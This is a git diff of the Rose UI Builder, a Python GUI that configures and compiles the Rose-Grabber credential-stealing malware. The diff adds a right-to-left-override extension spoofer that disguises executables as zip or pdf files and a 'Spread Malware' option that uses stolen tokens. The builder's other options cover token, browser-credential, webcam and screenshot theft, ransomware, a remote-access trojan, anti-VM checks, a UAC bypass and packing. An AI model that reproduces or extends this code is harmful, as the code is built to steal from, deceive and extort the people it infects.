@@ -39,7 +39,7 @@ gumbobr0ts_wallet_adr = "MY WALLET ADRESS HERE"
 
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-b.png'
-__version__ = '1.7'
+__version__ = '1.8'
 __debugm__ = False # Change only if you are a dev 
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-wh.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
@@ -84,7 +84,11 @@ data_builder = {
     "ransomware_email": "",
     "ransomware_webhook_url": "",
     "ransomware": False,
-    "return_zip": False
+    "return_zip": False,
+    "extension_spoofer": False,
+    "spoofed_extension": "",
+    "spread_malware": False,
+    "spread_malware_message": ""
 }
 
 links = {
@@ -155,14 +159,6 @@ async def test_webhook(webhook_url):
     except Exception as e:
         logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
         return 1
-
-#open_compile_log_button = ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(Path(__file__).resolve().parent / 'rosecompile.log'))
-#open_compile_log_button.visible = False
-
-#def random_str(count):
-#    characters = string.ascii_letters + string.digits
-#    random_string = ''.join(random.choice(characters) for _ in range(count))
-#    return random_string
 
 random.seed(0)
 
@@ -265,7 +261,9 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("ransomware = False", f"ransomware = {data_builder['ransomware']}") \
                 .replace("RANSOMWARE_EMAIL_", f"{data_builder['ransomware_email']}") \
                 .replace("RANSOMWARE_BTC_ADRESS_", f"{data_builder['ransomware_btc_adress']}") \
-                .replace("RANSOMWARE_WEBHOOKURL", f"{data_builder['ransomware_webhook_url']}")
+                .replace("RANSOMWARE_WEBHOOKURL", f"{data_builder['ransomware_webhook_url']}") \
+                .replace("spread_malware = False", f"spread_malware = {data_builder['spread_malware']}") \
+                .replace("SPRMALWARE_MSFG", f"{data_builder['spread_malware_message']}")
                  # noqa: E501
                 
             with open(f"{path}\\config.py", "w", encoding="utf-8") as f:
@@ -333,11 +331,11 @@ def _makebuild(q: Queue, data_builder) -> str:
                 logger.error(f"Error in obfuscating files: {e}")
 
     def pump_file():
-        logger.info(f"DEBUGGING File pumper is set to: {data_builder['file_pumper']}")
-        logger.info(f"DEBUGGING File pumper size is set to: {data_builder['file_pumper_size']}")
         pumping_proc = 0
         if data_builder["file_pumper"]:
             if data_builder["file_pumper_size"] is not None:
+                logger.info(f"DEBUGGING File pumper is set to: {data_builder['file_pumper']}")
+                logger.info(f"DEBUGGING File pumper size is set to: {data_builder['file_pumper_size']}")
                 logger.info("Entering file pump process")
                 try:
                     b_size = int(data_builder["file_pumper_size"]) * 1048576
@@ -351,16 +349,13 @@ def _makebuild(q: Queue, data_builder) -> str:
                 except Exception as e:
                     logger.error(f"Error in pumping file: {e}")
 
-    #open_compile_log_button = ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(Path(__file__).resolve().parent / 'rosecompile.log'))
-
     def compile():
         try:
             logger.info("Entering compile process")
             logger.info(f'Compile CMD Line: python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile')
             output_file = "rosecompile.log"
-            #open_compile_log_button.visible = True
             subprocess.call(
-                f'python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile',
+                f'start cmd /k "python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile"',
                 shell=True,
                 stdout=open(output_file, 'w'),
                 stderr=subprocess.STDOUT
@@ -384,27 +379,6 @@ def _makebuild(q: Queue, data_builder) -> str:
         except Exception as e:
             logger.error(f"Error in cleanup: {e}")
 
-    def return_zip():
-        logger.info('Entering return_zip')
-        homename = f'{data_builder["build_name"]}.scr' if data_builder["type_file"] == 'Screensaver (.scr)' else f'{data_builder["build_name"]}.exe'
-
-        if data_builder["return_zip"]:
-            with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
-                zipf.setpassword(zip_passw.encode('utf-8'))
-                zipf.write(homename, os.path.basename(homename))
-        
-        logger.info(f'Password for final zip is: {zip_passw}')
-        logger.debug(f'Encrypted password for final zip is: {zip_passw.encode("utf-8")}')
-
-        if data_builder["return_zip"]:
-            if os.path.exists(homename):
-                try:
-                    os.remove(homename)
-                except Exception as e:
-                    logger.error(f"Error in removing file: {e}")
-
-        logger.info('Finished return_zip')
-
     def assign_extension():
         old_exe_path = os.getcwd() + f'\{data_builder["build_name"]}.exe'
         new_scr_path = os.getcwd() + f'\{data_builder["build_name"]}.scr'
@@ -412,30 +386,85 @@ def _makebuild(q: Queue, data_builder) -> str:
             os.rename(old_exe_path, new_scr_path)
         
     def upx():
-        shutil.copy(os.path.join(os.getcwd(), "upx-4.1.0-win64", "upx.exe"), os.getcwd())
-        subprocess.run(f'upx -9kqvf {data_builder["build_name"]}.exe', shell=True)
+        logger.info('Entering upx')
+        try:
+            shutil.copy(os.path.join(os.getcwd(), "upx-4.1.0-win64", "upx.exe"), os.getcwd())
+            subprocess.run(f'upx -9kqvf {data_builder["build_name"]}.exe', shell=True)
+        except Exception as e:
+            logger.error(f"Error in upx: {e}")
+        logger.info('Finished upx')
+
+    def return_zip():
+        logger.info('Entering return_zip')
+        if data_builder["extension_spoofer"]:
+            homename = spoofed
+        else:
+            homename = f'{data_builder["build_name"]}.scr' if data_builder["type_file"] == 'Screensaver (.scr)' else f'{data_builder["build_name"]}.exe'
+
+        try:
+            if data_builder["return_zip"]:
+                with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
+                    zipf.setpassword(zip_passw.encode('utf-8'))
+                    zipf.write(homename, os.path.basename(homename))
+        
+                logger.info(f'Password for final zip is: {zip_passw}')
+                logger.debug(f'Encrypted password for final zip is: {zip_passw.encode("utf-8")}')
+
+                if os.path.exists(homename):
+                    try:
+                        os.remove(homename)
+                    except Exception as e:
+                        logger.error(f"Error in removing file: {e}")
+
+            logger.info('Finished return_zip')
+
+        except Exception as e:
+            logger.error(f"Error in return_zip: {e}")
+
+    def extension_spoofer():
+        logger.info('Entering extension_spoofer')
+        spoofer = '\u202e'
+        extension = data_builder["spoofed_extension"]
+        executable_to_spoof = f'{data_builder["build_name"]}.scr' if data_builder["type_file"] == 'Screensaver (.scr)' else f'{data_builder["build_name"]}.exe'
+
+        if data_builder["extension_spoofer"]:
+            try:
+                extension_added = executable_to_spoof[:len(executable_to_spoof) - 4] + extension[::-1] + executable_to_spoof[-4:]
+
+                global spoofed
+                spoofed = extension_added[:len(extension_added) - 7] + spoofer + extension_added[-7:]
+
+                with open(spoofed, "wb") as spoofed_executable:
+                    with open(executable_to_spoof, "rb") as source_executable:
+                        spoofed_executable.write(source_executable.read())
+
+            except Exception as e:
+                logger.error(f"Error in extension_spoofer: {e}")
+
+        logger.info('Finished extension_spoofer')
 
     create_dir()
     q.put_nowait(0.1)
     get_files()
-    q.put_nowait(0.2)
+    q.put_nowait(0.15)
     edit_config()
-    q.put_nowait(0.3)
+    q.put_nowait(0.2)
     #obfuscate()
-    q.put_nowait(0.4)
+    q.put_nowait(0.25)
     compile()
-    q.put_nowait(0.5)
+    q.put_nowait(0.4)
     cleanup()
-    q.put_nowait(0.6)
+    q.put_nowait(0.45)
     upx()
-    q.put_nowait(0.7)
+    q.put_nowait(0.5)
     pump_file()
-    q.put_nowait(0.8)
+    q.put_nowait(0.7)
     assign_extension()
-    q.put_nowait(0.9)
+    q.put_nowait(0.75)
+    extension_spoofer()
+    q.put_nowait(0.85)
     return_zip()
     q.put_nowait(1)
-    #open_compile_log_button.visible = False
     return 'Done!'
 
 def select_icon():
@@ -451,13 +480,13 @@ def select_icon():
 
 def _home():
     with ui.dialog() as dialog, ui.card():
-        if data_builder["return_zip"]:
+        if bool(data_builder['return_zip']):
             ui.label(f'If the compilation process completed successfully, you should find the password protected zip archive within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.\nThe name of the zip archive is: {zip_name}\nThe password for the zip archive is: {zip_passw}')
         else:
             ui.label('If the compilation process completed successfully, you should find the executable file within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.')
         ui.button('Open Folder', on_click=lambda: os.startfile(Path(__file__).resolve().parent))
         ui.button('Join Discord', on_click=lambda: webbrowser.open(links["rose_discord"]))
-        if data_builder["return_zip"]:
+        if bool(data_builder["return_zip"]):
             ui.button('Copy password', on_click=lambda: pyperclip.copy(zip_passw))
         ui.button('Close', on_click=dialog.close)
         
@@ -477,7 +506,7 @@ def _home():
     with ui.column():
         ui.input(
             label='Webhook URL',
-            placeholder='Rose on top baby',  
+            placeholder='Rose on top baby',
             on_change=lambda e: change_data("webhook_url", e.value)
         ).props('inline color=pink-3').classes('w-full')
         ui.input(
@@ -501,6 +530,10 @@ def _home():
             _pumper = ui.checkbox('Pump file', on_change=lambda e: change_data('file_pumper', e.value)).props('inline color=pink-3')
             ui.input(label='Pump Size', placeholder='Size in MB',
                 on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=pink-3')
+        with ui.row():
+            _spoofer = ui.checkbox('Extension Spoofer', on_change=lambda e: change_data('extension_spoofer', e.value)).props('inline color=pink-3')
+            ui.input(label='Spoofed Extension', placeholder='zip, pdf...',
+                on_change=lambda e: change_data('spoofed_extension', e.value)).bind_visibility_from(_spoofer, 'value').props('inline color=pink-3')
         ui.checkbox('Return password protected ZIP archive', on_change=lambda e: change_data('return_zip', e.value)).props('inline color=pink-3')
         ui.button(
             'Test Webhook',
@@ -523,7 +556,7 @@ def _functions():
         with ui.expansion('System', icon='work').classes('w-full'):
             with ui.row():
                 _startup = ui.checkbox('Startup', on_change=lambda e: change_data('startup', e.value)).props('inline color=pink')
-                ui.checkbox('Use scr file', on_change=lambda e: change_data('use_scr', e.value)).bind_visibility_from(_startup, 'value').props('inline color=pink')  
+                ui.checkbox('Use scr file', on_change=lambda e: change_data('use_scr', e.value)).bind_visibility_from(_startup, 'value').props('inline color=pink')
             with ui.row():
                 _inj = ui.checkbox(
                     'Injection',
@@ -534,12 +567,18 @@ def _functions():
                     on_change=lambda e: change_data('nitro_buy', e.value)
                 ).bind_visibility_from(_inj, 'value').props('inline color=pink')  
                 
+            ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=pink')
+            ui.checkbox('Anti-VM', on_change=lambda e: change_data('antivm', e.value)).props('inline color=pink')
             ui.checkbox('UAC Bypass', on_change=lambda e: change_data('uac_bypass', e.value)).props('inline color=pink')
 
         with ui.expansion('Grabber', icon='work').classes('w-full'):
             with ui.row():
                 with ui.column():
-                    ui.checkbox('Token', on_change=lambda e: change_data('token', e.value)).props('inline color=green')
+                    with ui.row():
+                        _token = ui.checkbox('Token', on_change=lambda e: change_data('token', e.value)).props('inline color=green')
+                        _spread = ui.checkbox('Spread Malware', on_change=lambda e: change_data('spread_malware', e.value)).bind_visibility_from(_token, 'value').props('inline color=green')
+                        ui.input(label='Message', placeholder='Rose on top baby', on_change=lambda e: change_data('spread_malware_message', e.value)).bind_visibility_from(_spread, 'value').props('inline color=green')
+
                     ui.checkbox('Browser Credentials', on_change=lambda e: change_data('browser', e.value)).props('inline color=green')
                     ui.checkbox('Screenshot', on_change=lambda e: change_data('screenshot', e.value)).props('inline color=green')
                     ui.checkbox('Webcam', on_change=lambda e: change_data('webcam', e.value)).props('inline color=green')
@@ -548,6 +587,7 @@ def _functions():
                     ui.checkbox('Device Information', on_change=lambda e: change_data('deviceinf', e.value)).props('inline color=green')
                     ui.checkbox('IP & Wi-Fi Data', on_change=lambda e: change_data('ipinf', e.value)).props('inline color=green')
                     ui.checkbox('Roblox', on_change=lambda e: change_data('roblox', e.value)).props('inline color=green')
+                    ui.checkbox('Ping', on_change=lambda e: change_data('ping', e.value)).props('inline color=green')
 
         with ui.expansion('Advanced', icon='work').classes('w-full'):
             with ui.column():
@@ -569,9 +609,7 @@ def _functions():
                         on_change=lambda e: change_data('knight_user_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                     ui.input(label='Knight-RAT Command Prefix', placeholder='Knight on top baby',
                         on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
-                ui.checkbox('Ping', on_change=lambda e: change_data('ping', e.value)).props('inline color=yellow-7')
-                ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=yellow-7')
-                ui.checkbox('Anti-VM', on_change=lambda e: change_data('antivm', e.value)).props('inline color=yellow-7')
+                
                 with ui.row():
                     _ransom = ui.checkbox('Rose Ransomware', on_change=lambda e: change_data('ransomware', e.value)).props('inline color=yellow-7')
                     ui.input(label='Bitcoin Wallet adress', placeholder='Rose On Top baby!!!',
@@ -599,7 +637,7 @@ def _github():
                     ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
                     ui.button(on_click=lambda: open_link("gumbobr0t_github")).props("round icon=code color=blue-11")
 
-            with ui.row():               
+            with ui.row():
                 with ui.card_section():
                     ui.label("suegdu").classes("text-h6")
                     ui.markdown('<em>- "bruh"</em>').classes("text-subtitle5")
